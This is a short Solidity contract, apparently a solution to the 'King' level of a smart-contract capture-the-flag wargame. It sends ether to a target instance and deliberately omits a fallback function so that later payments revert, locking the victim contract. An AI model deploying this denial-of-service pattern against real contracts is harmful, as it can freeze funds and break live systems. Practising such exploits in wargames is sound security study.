pragma solidity ^0.4.18;

contract KingAttack {
    address desiredInstance = 0xa1748346096fd2520ee7e27cff61b5b9e7ea2957;// put your instance address here
    constructor() public payable{ //it has to be payable for the King contract to send you the money
    //the idea is to not have a fallback function so that any payment would fail and revert
    }
    
    function exploit() public {
        desiredInstance.call.value(1010000000000000000)(); //send the sum above existing prize that will make us king
    }
}